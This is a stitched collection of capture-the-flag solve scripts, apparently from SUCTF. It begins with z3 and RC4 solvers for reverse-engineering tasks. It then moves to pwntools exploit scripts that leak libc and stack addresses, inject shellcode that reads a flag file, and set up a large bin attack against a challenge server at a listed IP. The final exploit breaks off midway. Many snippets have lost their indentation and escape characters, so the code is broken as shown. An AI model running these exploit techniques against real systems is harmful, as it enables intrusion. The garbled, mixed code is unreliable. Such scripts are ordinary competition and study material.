def  cfec(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  d02c(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  d078(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  d0c4(a1, a2, a3):
  return (a1 + a3 + a2)
def  d0f8(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  d144(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  d190(a1, a2, a3):
  return (a1 + a3 + a2)
def  d1c4(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  d204(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  d244(a1, a2, a3):
  return (a1 + a3 + a2)
def  d278(a1, a2, a3):
  return (a1 + a3 + a2)
def  d2ac(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  d2f8(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  d338(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  d378(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  d3b8(a1, a2, a3, a4,  a5):
  return (a1 ^ a3 ^ a4 ^ a5) + a2
def  d404(a1, a2, a3, a4,  a5):
  return (a1 ^ a3 ^ a4 ^ a5) + a2
def  d450(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  d49c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  d4dc(a1, a2, a3):
  return (a1 + a3 + a2)
def  d510(a1, a2, a3):
  return (a1 + a3 + a2)
def  d544(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  d590(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  d5dc(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  d61c(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  d668(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  d6a8(a1, a2, a3):
  return (a1 + a3 + a2)
def  d6dc(a1, a2, a3):
  return (a1 + a3 + a2)
def  d710(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  d75c(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  d7a8(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  d7e8(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  d834(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  d880(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  d8c0(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  d900(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  d94c(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  d98c(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  d9cc(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  da18(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  da64(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  dab0(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  daf0(a1, a2, a3):
  return (a1 + a3 + a2)
def  db24(a1, a2, a3):
  return (a1 + a3 + a2)
def  db58(a1, a2, a3):
  return (a1 + a3 + a2)
def  db8c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  dbcc(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  dc18(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  dc64(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  dca4(a1, a2, a3):
  return (a1 + a3 + a2)
def  dcd8(a1, a2, a3):
  return (a1 + a3 + a2)
def  dd0c(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  dd4c(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  dd98(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  ddd8(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  de24(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  de64(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  de98(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  ded8(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  df24(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  df64(a1, a2, a3):
  return (a1 + a3 + a2)
def  df98(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  dfe4(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  e024(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  e064(a1, a2, a3):
  return (a1 + a3 + a2)
def  e098(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  e0cc(a1, a2, a3):
  return (a1 + a3 + a2)
def  e100(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  e140(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  e180(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  e1b4(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)

func_list = [a224,a264,a2b0,a2f0,a33c,a370,a3bc,a3fc,a43c,a47c,a4b0,a4e4,a524,a564,a5a4,a5d8,a618,a64c,a680,a6cc,a700,a74c,a78c,a7c0,a7f4,a840,a874,a8b4,a900,a940,a980,a9b4,a9e8,aa1c,aa50,aa9c,aad0,ab04,ab38,ab84,abc4,ac10,ac5c,aca8,acdc,ad1c,ad50,ad90,add0,ae10,ae5c,ae9c,aedc,af28,af68,afa8,afe8,b01c,b05c,b0a8,b0dc,b11c,b168,b1a8,b1e8,b234,b274,b2c0,b2f4,b328,b35c,b3a8,b3f4,b434,b480,b4c0,b50c,b54c,b58c,b5c0,b5f4,b634,b674,b6c0,b70c,b758,b798,b7e4,b830,b870,b8b0,b8f0,b93c,b970,b9bc,b9fc,ba48,ba7c,babc,bafc,bb30,bb64,bb98,bbe4,bc18,bc64,bcb0,bcf0,bd24,bd64,bdb0,bdfc,be30,be64,bea4,bed8,bf0c,bf40,bf74,bfb4,bff4,c034,c074,c0b4,c0e8,c134,c174,c1b4,c1f4,c240,c274,c2c0,c2f4,c340,c380,c3cc,c400,c44c,c498,c4cc,c500,c54c,c598,c5d8,c60c,c64c,c68c,c6d8,c70c,c74c,c780,c7b4,c7f4,c840,c88c,c8d8,c924,c958,c9a4,c9d8,ca0c,ca40,ca80,cac0,caf4,cb28,cb5c,cb9c,cbd0,cc04,cc38,cc78,ccb8,ccec,cd20,cd6c,cda0,cdec,ce2c,ce60,ceac,cee0,cf20,cf60,cfa0,cfec,d02c,d078,d0c4,d0f8,d144,d190,d1c4,d204,d244,d278,d2ac,d2f8,d338,d378,d3b8,d404,d450,d49c,d4dc,d510,d544,d590,d5dc,d61c,d668,d6a8,d6dc,d710,d75c,d7a8,d7e8,d834,d880,d8c0,d900,d94c,d98c,d9cc,da18,da64,dab0,daf0,db24,db58,db8c,dbcc,dc18,dc64,dca4,dcd8,dd0c,dd4c,dd98,ddd8,de24,de64,de98,ded8,df24,df64,df98,dfe4,e024,e064,e098,e0cc,e100,e140,e180,e1b4,]
func_arg_number = [0x2,0x3,0x2,0x3,0x1,0x3,0x2,0x2,0x2,0x1,0x1,0x2,0x2,0x2,0x1,0x2,0x1,0x1,0x3,0x1,0x3,0x2,0x1,0x1,0x3,0x1,0x2,0x3,0x2,0x2,0x1,0x1,0x1,0x1,0x3,0x1,0x1,0x1,0x3,0x2,0x3,0x3,0x3,0x1,0x2,0x1,0x2,0x2,0x2,0x3,0x2,0x2,0x3,0x2,0x2,0x2,0x1,0x2,0x3,0x1,0x2,0x3,0x2,0x2,0x3,0x2,0x3,0x1,0x1,0x1,0x3,0x3,0x2,0x3,0x2,0x3,0x2,0x2,0x1,0x1,0x2,0x2,0x3,0x3,0x3,0x2,0x3,0x3,0x2,0x2,0x2,0x3,0x1,0x3,0x2,0x3,0x1,0x2,0x2,0x1,0x1,0x1,0x3,0x1,0x3,0x3,0x2,0x1,0x2,0x3,0x3,0x1,0x1,0x2,0x1,0x1,0x1,0x1,0x2,0x2,0x2,0x2,0x2,0x1,0x3,0x2,0x2,0x2,0x3,0x1,0x3,0x1,0x3,0x2,0x3,0x1,0x3,0x3,0x1,0x1,0x3,0x3,0x2,0x1,0x2,0x2,0x3,0x1,0x2,0x1,0x1,0x2,0x3,0x3,0x3,0x3,0x1,0x3,0x1,0x1,0x1,0x2,0x2,0x1,0x1,0x1,0x2,0x1,0x1,0x1,0x2,0x2,0x1,0x1,0x3,0x1,0x3,0x2,0x1,0x3,0x1,0x2,0x2,0x2,0x3,0x2,0x3,0x3,0x1,0x3,0x3,0x1,0x2,0x2,0x1,0x1,0x3,0x2,0x2,0x2,0x3,0x3,0x3,0x2,0x1,0x1,0x3,0x3,0x2,0x3,0x2,0x1,0x1,0x3,0x3,0x2,0x3,0x3,0x2,0x2,0x3,0x2,0x2,0x3,0x3,0x3,0x2,0x1,0x1,0x1,0x2,0x3,0x3,0x2,0x1,0x1,0x2,0x3,0x2,0x3,0x2,0x1,0x2,0x3,0x2,0x1,0x3,0x2,0x2,0x1,0x1,0x1,0x2,0x2,0x1,0x3,]
def gen_rand():
    global ii
    global jj

    ii = (ii+1)%256
    jj = (jj + sbox[ii])%256
    v2 = (sbox[ii]+sbox[jj])% 256
    return v2

def check(data):
    global ii
    global jj
    result = "a"
    ii = 0
    jj = 0
    len1 = len(data)
    assert(len1 == 0x20)
    s = [i for i in data]
    for i in range(8*len1):
        rnum0 = gen_rand()
        rnum1 = gen_rand()
        rnum2 = gen_rand()
        ridx1 = gen_rand() % len1
        ridx2 = gen_rand() % len1
        r_offset = gen_rand()
        arr = [hex(rnum0),hex(rnum1),hex(rnum2),hex(ridx1),hex(ridx2),hex(r_offset)]
        
        if(func_arg_number[r_offset]==1):
            a1= rnum0
            a2 = s[ridx1]
            a3 = s[ridx2]
            result = func_list[r_offset](a1,a2,a3) 
           
        if(func_arg_number[r_offset]==2):
            a1= rnum0
            a2= rnum1
            a3 = s[ridx1]
            a4 = s[ridx2]
            result = func_list[r_offset](a1,a2,a3,a4) 
            
        if(func_arg_number[r_offset]==3):
            a1= rnum0
            a2= rnum1
            a3 =rnum2
            a4 = s[ridx1]
            a5 = s[ridx2]
            result = func_list[r_offset](a1,a2,a3,a4,a5) 
        s[ridx1] = result
        
        
    return s
    # for m in s:
    #     print(hex(m),end=',')

result = [0x6e179,0x10a34,0x353c2,0x1174b,0x70bda,0xb015,0x3bfeb,0x2d16,0x4a320,0x1f1ac,0x8f6b,0x2098e,0x8d4,0x2428f,0x1fb5f,0x10bd5,0x10e7,0x3171b,0x1b19d,0x168,0x8dcf,0x246ba,0x7ae5d,0x6f10,0x6e11,0x13d8a,0x169b,0x3701,0x321d6,0x465f6,0x106bc,0x1298e,]

from z3 import *
cin = [i for i in b"aaaaa"]+[BitVec('x[%d]'%i,8) for i in range(32-5)]

result = [0x000D7765, 0x00011EBD, 0x00032D12, 0x00013778, 0x0008A428, 0x0000B592, 0x0003FA57, 0x00001616, 
    0x0003659E, 0x0002483A, 0x00002882, 0x000508F4, 0x00000BAD, 0x00027920, 0x0000F821, 0x00019F83, 
    0x00000F97, 0x00033904, 0x000170D5, 0x0000016C, 0x0000CF5D, 0x000280D2, 0x000A8ADE, 0x00009EAA, 
    0x00009DAB, 0x0001F45E, 0x00003214, 0x000052FA, 0x0006D57A, 0x000460ED, 0x000124FF, 0x00013936, ]
cin = [i for i in b"SUCTF"]+[BitVec('x[%d]'%i,8) for i in range(32-5)]

ans = check(cin)
    #print(ans[0])
S = Solver()
for i in range(0x20):
    S.add(ans[i] == result[i])
print(S.check())
flag = S.model()
print(flag)

x = [9]*100
x[0] = 123
x[16] = 95
x[14] = 105
x[17] = 77
x[22] = 114
x[24] = 33
x[21] = 51
x[25] = 33
x[18] = 52
x[11] = 100
x[1] = 89
x[19] = 115
x[9] = 65
x[8] = 95
x[7] = 51
x[2] = 48
x[20] = 116
x[26] = 125
x[12] = 114
x[3] = 117
x[6] = 114
x[13] = 48
x[23] = 33
x[5] = 65
x[4] = 95
x[10] = 110
x[15] = 100
print(bytes(x))
# check(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab")
# print(len(func_list))
# print(len(func_arg_number))
from Crypto.Cipher import ARC4

key = b"suctf"
enc = [0x2F, 0x5A, 0x57, 0x65, 0x14, 0x8F, 0x69, 0xCD, 0x93, 0x29, 0x1A, 0x55, 0x18, 0x40, 0xE4, 0x5E]
rc4 = ARC4.new(key)
print(rc4.decrypt(bytes(enc)))

enc1 = [ 0x41, 0x6D, 0x62, 0x4D, 0x53, 0x49, 0x4E, 0x29, 0x28]
print(bytes([enc1[i] + i for i in range(len(enc1))]))
from z3 import *
import hashlib
table = [  0x03, 0x04, 0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0x02, 0xFF, 0xFF,
0x04, 0xFF, 0x07, 0xFF, 0xFF, 0xFF, 0x04, 0x06, 0x06, 0xFF,
0xFF, 0xFF, 0xFF, 0x06, 0x05, 0x06, 0x04, 0xFF, 0x05, 0xFF,
0x04, 0x07, 0xFF, 0x08, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0x06,
0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0x03, 0xFF, 0x03,
0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x05,
0x04, 0x05, 0x07, 0x06, 0xFF, 0xFF, 0x04, 0xFF, 0x02, 0x01,
0xFF, 0xFF, 0xFF, 0x03, 0x04, 0xFF, 0xFF, 0x05, 0x04, 0x03,
0xFF, 0xFF, 0x07, 0x04, 0x03, 0xFF, 0xFF, 0x01, 0x01, 0xFF,
0xFF, 0x04, 0x03, 0xFF, 0x02, 0xFF, 0x04, 0x03, 0xFF, 0xFF,
0x02, 0xFF, 0x05, 0x04, 0xFF, 0xFF, 0x02, 0x02, 0xFF, 0xFF,
0x04, 0xFF, 0x04, 0xFF, 0x03, 0x05, 0x06, 0xFF, 0xFF, 0x00,
0xFF, 0xFF, 0xFF, 0x02, 0xFF, 0xFF, 0xFF, 0x01, 0x04, 0xFF,
0xFF, 0x07, 0x05, 0xFF, 0xFF, 0x03, 0x03, 0x02, 0xFF, 0xFF,
0x04, 0xFF, 0xFF, 0x05, 0x07, 0xFF, 0x03, 0x02, 0x04, 0x04,
0xFF, 0x07, 0x05, 0x04, 0x03, 0xFF, 0xFF, 0x04, 0xFF, 0x02,
0x04, 0x05, 0xFF, 0xFF, 0x06, 0x05, 0x04, 0xFF, 0x02, 0xFF,
0xFF, 0x07, 0x04, 0xFF, 0xFF, 0x03, 0xFF, 0x04, 0x04, 0xFF,
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x03, 0x02, 0x02,
0xFF, 0xFF, 0x02, 0x04, 0x03, 0x05, 0xFF, 0xFF, 0x05, 0xFF,
0x04, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF,
0x03, 0x03, 0xFF, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06,
0xFF, 0x06, 0x06, 0xFF, 0x07, 0x06, 0x04, 0xFF, 0x04, 0x03,
0xFF, 0x04, 0x03, 0x05, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0xFF, 0x04, 0x06, 0x07, 0xFF, 0xFF, 0x04, 0xFF, 0xFF,
0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x05, 0xFF, 0xFF, 0x06, 0x07,
0x07, 0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0x02, 0x04, 0x04,
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0x07, 0x07,
0x06, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0x03,
0x05, 0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x06, 0xFF, 0x05, 0xFF,
0xFF, 0x07, 0x08, 0xFF, 0xFF, 0x03, 0xFF, 0x03, 0xFF, 0xFF,
0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0x06, 0x05, 0x03, 0xFF, 0x04, 0x05, 0x05, 0x03, 0xFF,
0xFF, 0x06, 0x05, 0x05, 0x06, 0xFF, 0x06, 0x05, 0x02, 0x04,
0x03, 0x04, 0xFF, 0xFF, 0x03, 0x04, 0x04, 0x06, 0x05, 0xFF,
0x03, 0xFF, 0x05, 0x05, 0x05, 0xFF, 0xFF, 0x05, 0xFF, 0xFF,
0x04, 0xFF, 0xFF, 0x04, 0xFF, 0x07, 0x07, 0x08, 0x06, 0xFF,
0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0x04, 0xFF, 0x03,
0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x05, 0x03]
def sub_1352(a1,a2,a3):
if a2 >= 0 and a3 >= 0 and a2 <= 19 and a3 <= 19:
    return ((a1[(20 * a2 + a3) // 8] & 0xff) >> ((20 * a2 + a3) & 7)) & 1
else:
    return 0
def sub_13C9(a1,a2,a3):
v5 = 0
for i in range(-1,2):
    for j in range(-1,2):
    v5 += sub_1352(a1,i+a2,j+a3)
return v5
s = Solver()
flag = [BitVec(f"v{i}",8) for i in range(50)]
for i in range(20):
for j in range(20):
    if table[i * 20 + j] != 0xff:
    v2 = table[20 * i + j]
    v5 = sub_13C9(flag, i,j)

    s.add(v2 == v5)
res = ""
if s.check() == sat:
data = s.model()
for i in flag:
    res += hex(data[i].as_long())[2:].rjust(2,"0")
flag = ""
for i in res:
    if i == "0":
    flag += "a"
    if i == "1":
    flag += "b"
    if i == "2":
    flag += "c"
    if i == "3":
    flag += "d"
    if i == "4":
    flag += "e"
    if i == "5":
    flag += "f"
    if i == "6":
    flag += "0"
    if i == "7":
    flag += "1"
    if i == "8":
    flag += "2"
    if i == "9":
    flag += "3"
    if i == "a":
    flag += "4"
    if i == "b":
    flag += "5"
    if i == "c":
    flag += "6"
    if i == "d":
    flag += "7"
    if i == "e":
    flag += "8"
    if i == "f":
    flag += "9"
print(hashlib.md5(flag.encode()).hexdigest())
def sub_62F0(a1,char_list):

while a1 > 0:
    char_list.append(a1 % 0xA + 0x30)
    a1 //= 10

return char_list[::-1]

def sub_6D20(a1,a2,s):
v110 = len(a1)
v109 = len(a2)
v108 = v109 + v110
v126 = [0] * v108
for j in range(v110 - 1,-1,-1):
    for m in range(v109 - 1, -1, -1):
    v103 = m + j + 1
    v102 = v126[v103] + (a2[m] - 48) * (a1[j] - 48)
    v126[v103] = v102 % 10
    v126[m + j] += v102 // 10

for i in range(v108):
    s.append(v126[i] + 0x30)

return s
def sub_8270(a1,a2,a3):
s = a1[::-1]
print(s)
v112 = 0
for j in range(len(s)):
    v109 = v112 + a2 * (s[j] - 48)
    v112 = v109 // 10
    v127 = v109 % 10 + 48
    a3.append(v127)

a3 = a3[::-1]

return a3
def sub_9890(a1,a2,a3):
s = a1[::-1]
dest = a2[::-1]
v84 = len(s)
v83 = len(dest)
v82 = 0
if v84 <= v83:
    v77 = v83
else:
    v77 = v84

for j in range(v77):
    if j >= v84:
    v61 = 0
    else:
    v61 = s[j] - 48

    if  j >= v83:
    v60 = 0
    else:
    v60 = dest[j] - 48
    v79 = v82 + v60 + v61
    v82 = v79 // 10
    v95 = v79 % 10 + 48
    a3.append(v95)
a3 = a3[::-1]

return a3
def sub_A8F0(a1,a2,a3):
s = a1[::-1]

dest = a2[::-1]
v122 = len(s)
v121 = len(dest)

v120 = 0

for j in range(v122):
    if (j >= v121):
    v101 = 0
    else:
    v101 = dest[j] - 48
    v117 = s[j] - 48 - v101

    a3.append(v117 + 0x30)

while a3[-1] == 0x30:
    a3 = a3[:-1]

return a3[::-1]

def sub_C160(a1,a2):
s = a1
v60 = len(a1)
v59 = 0
for j in range(v60):
    v56 = (s[j] - 48 + 10 * v59)
    v59 = v56 % 2
    src = (v56 // 2 + 48)
    a2.append(src)
return a2

def main(a1):
char_list = []
char_list = sub_62F0(a1,char_list)
s = sub_6D20(char_list,char_list,[])
v62 = sub_8270(char_list,2,[])
v61 = sub_9890(s,v62,[])
print(v61)
v60 = sub_A8F0(v61,[0x33],[])
print(v60)
res = sub_C160(v60,[])

return bytes(res).decode()
import math
import libnum
enc = [999272289930604998,1332475531266467542,1074388003071116830,1419324015697459326,978270870200633520,369789474534896558,344214162681978048,2213954953857181622]

for i in range(len(enc)):
a = enc[i] * 2 + 3
flag = int(math.sqrt(a + 1) - 1)
print(libnum.n2s(flag)[::-1].decode(),end="")
import time 
from pwn import * 
from ctypes import * 
from LibcSearcher import * 
 
RED = ' 33[91m' 
GREEN = ' 33[92m' 
YELLOW = ' 33[93m' 
BLUE = ' 33[94m'  
RESET = ' 33[0m'  
u64_Nofix=lambda p:
u64(p.recvuntil(b'n')[:-1].ljust(8,b'x00')) 
u64_fix=lambda p:
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00')) 
u64_8bit=lambda p:
u64(p.recv(8)) 
dir  =    lambda s :
log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s))) 
def int_fix(p,count=12): 
    p.recvuntil(b'0x') 
    return int(p.recv(count),16) 
# p = process(["qemu-arm","-g", "2233","../chall"]) 
 
FILENAME='./pwn' 
elf=ELF(FILENAME) 
libc=elf.libc 
 
debug =int(sys.argv[1]) 
print(f"debug -> {debug}") 
context.arch='amd64' 
 
if debug == 0: 
    argv=['aa'] 
    p=process([FILENAME]+argv) 
if debug == 1: 
    p = remote('1.95.76.73',10001) 
 
if debug ==2: 
    gdbscript = ''' 
        b* 0x402778 
        c 
    ''' 
    argv=['a'*21] 
    p = gdb.debug([FILENAME]+argv, gdbscript=gdbscript) 
     
def command(option): 
    p.recvuntil(b'+++++++++++++++++++++++++++++++++++++++++++++') 
    p.sendline(bytes(str(option),'utf-8')) 
 
def add_code(id,name,buf): 
    command(1) 
    p.recvuntil(b'ID:') 
    p.sendline(bytes(str(id),'utf-8')) 
    p.recvuntil(b':') 
    p.send(name) 
    p.recvuntil(b':') 
    p.send(buf) 
    print((p.recvline().decode('utf-8'))) 
def del_code(id): 
    command(2) 
    p.recvuntil(b'ID:') 
    p.sendline(bytes(str(id),'utf-8')) 
def add_file(name,buf): 
    command(8) 
    p.recvuntil(b':') 
    p.sendline(bytes(str(1),'utf-8')) 
    do_add_file(name,buf) 
def do_add_file(name,buf): 
    p.recvuntil("请输入文件名称".encode()) 
    p.sendline(name) 
    p.recvuntil("请输入文件内容".encode()) 
    p.send(buf) 
def show_code(): 
    command(5) 
    p.sendlineafter(b':',b'1') 
sh=''' 
    lea rsi,[rip+0x10101010] 
    sub rsi,0x10101010 
    xor rdi,rdi 
    xor edx,edx 
    mov dl,0xff 
    xor rax,rax 
    syscall 
''' 
 
# gdb.attach(p,'b* 0x4014FB') 
code=[1,2,20,27,33,56,68,69,87] 
code.reverse() 
print(code) 
for i in code: 
    del_code(i) 
attack_code=[] 
count=0 
for i in range(0x1314,0x1314+12+len(code)-1,1): 
    print(f"count -> {count} ",end="") 
    count+=1 
    payload=f'mowen{i}'.encode() 
    length=len(payload) 
    if(i==0x1314):
payload=payload+b'a'*(0x12-length-1)+b'_' 
    if(i==0x1314+1):
payload=payload+b'a'*(0x2a-length-1)+b'_' 
    if(i==0x1314+2):
payload=asm(sh) 
    add_code(i,'mowen',payload) 
    attack_code.append(i) 
show_code() 
p.recvuntil(b'_') 
libc_addr=u64_Nofix(p) 
dir("libc_addr") 
 
p.recvuntil(b'_') 
stack_addr=u64_Nofix(p) 
dir("stack_addr") 
 
command(8) 
p.recvuntil(b':') 
p.sendline(bytes(str(0x100),'utf-8')) 
do_add_file(b'mowen123',b'a'*8)
# b20 
do_add_file(b'mowen123',b'b'*8)
# b3e 
do_add_file(b'mowen123',b'c'*8+b'x00') # b47 
do_add_file(b'mowen123',b'x12')
# b50 
do_add_file(b'mowen123',b'e'*7+b'x00')  
payload=p64(stack_addr-0xadea) 
do_add_file(b'mowen123',payload) 
do_add_file(b'mowen123',b'x00'*8+b'x00') 
 
print(asm(sh)) 
 
sleep(1) 
sh2=f''' 
    {shellcraft.open("flag")} 
    {shellcraft.read('rax','rsp',0x100)} 
    {shellcraft.write(1,'rsp',0x100)} 
''' 
p.sendline(b'x90'*(0x20)+asm(sh2)) 

p.interactive()
int *__fastcall sub_17D8(int *a1)
{
  write(1, (char *)a1 + *a1 + 4, 8uLL);
  return a1 + 1;
}
from pwn import *
from struct import pack
from ctypes import *
import base64
from subprocess import run
    #from LibcSearcher import *
from struct import pack
import tty

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :
print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda    :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32    = lambda    :
u32(p.recv(4).ljust(4,b'x00'))
uu64    = lambda    :
u64(p.recv(6).ljust(8,b'x00'))
int16   = lambda data   :
int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

def create(idx, size):
    pay = b'x01x10'+p8(idx)+p32(size)
    return pay

def dele(idx):
    pay = b'x01x11'+p8(idx)
    return pay

ADD = 0x10
SUB = 0x11
MUL = 0x12
DIV = 0x13
SET_OFFSET_VAL = 0x14
GET_OFFSET_VAL = 0x15
PRINT = 0x16
def xx0(idx):
    pay = b'x02'+p8(idx)+b'x10'

def start_xx1(idx):
    return b'x02'+p8(idx)

def xx1_0(method, val0, val1 = 0):
    if val0 < 0:
        pay = b'x10'+p8(method)+p32(0x100000000+val0)
    else:
        pay = b'x10'+p8(method)+p32(val0)
    if method == SET_OFFSET_VAL or method == GET_OFFSET_VAL:
        pay += p64(val1)
    elif method == PRINT:
        pass
    else:
        pay += p32(val1)
    return pay

LS = 0x10
RS = 0x11
XOR = 0x12
OR = 0x13
AND = 0x14
def xx1_1(method, val):
    pay = b'x11'+p8(method)+ val + p32(0)
    return pay

def stop_xx1():
    return b'x00'

def next_step():
    return b'x03'

def store(idx, offset, value):
    return start_xx1(idx) + xx1_0(SET_OFFSET_VAL, offset, value) + stop_xx1()
def load(idx, heap_offset, data_offset):
    return start_xx1(idx) + xx1_0(GET_OFFSET_VAL, heap_offset, data_offset) + stop_xx1()
def show(idx, offset):
    return start_xx1(idx) + xx1_0(PRINT, offset) + stop_xx1()

def xor(idx, val):
    pl = start_xx1(idx)
    for i in range(len(val)//4):
        pl += xx1_1(0x12, val[i*4:i*4+4])
    pl += stop_xx1()
    return pl

def xor_(idx, val):
    pl = start_xx1(idx)
    for i in range(len(val)//4):
        pl += xx1_1(0x12, val[i*4:i*4+4])
    return pl
def store_(offset, value):
    return xx1_0(SET_OFFSET_VAL, offset, value)
def load_(offset, value):
    return xx1_0(GET_OFFSET_VAL, offset, value)

    #p = remote('1.95.76.73', 10011)
p = process('./pwn')

    #debug('b *$rebase(0x1784)nb *$rebase(0x17d8)')

# show libc_base
pl  = create(0, 0x500)
pl += create(0xf, 0x500)
pl += dele(0)
pl += create(0, 0x500)

pl += load(0, 0, 0)
pl += show(0, -0x11)

pl += next_step()

sa(b'bytes):n', pl)
libc_base = u64(r(8)) - 0x203b20

    #debug('b *$rebase(0x17d8)nb _exitnb *$rebase(0x1784)n')

pl  = create(1, 0x428)
pl += create(2, 0x418)
pl += create(3, 0x418)
pl += dele(1)
pl += create(4, 0x438)
pl += dele(3)
pl += next_step()
sa(b'bytes):n', pl)

# show heap_base

pl = xor_(0xf, b'x00'*0x200)
pl += load_(0x328, 0)
pl += stop_xx1()
pl += next_step()
sa(b'bytes):n', pl)

pl = show(0xf, 0x500)
pl += next_step()
sa(b'bytes):n', pl)
heap_base = u64(r(8)) - 0xcb0

# lager bin attack

mp = libc_base + 0x2031f0

_IO_list_all = libc_base + libc.sym['_IO_list_all']
pl = xor_(0xf, b'x00'*0x200)
pl += store_(0x328, mp - 0x20 - 8)
pl += stop_xx1()
pl += create(5, 0x438)
pl += next_step()
sa(b'bytes):n', pl)

pl = create(0x7, 0x500)
pl += create(0x8, 0x500)
pl += create(0x9, 0x500)

pl += dele(0x9)
pl += dele(0x8)
pl += next_step()
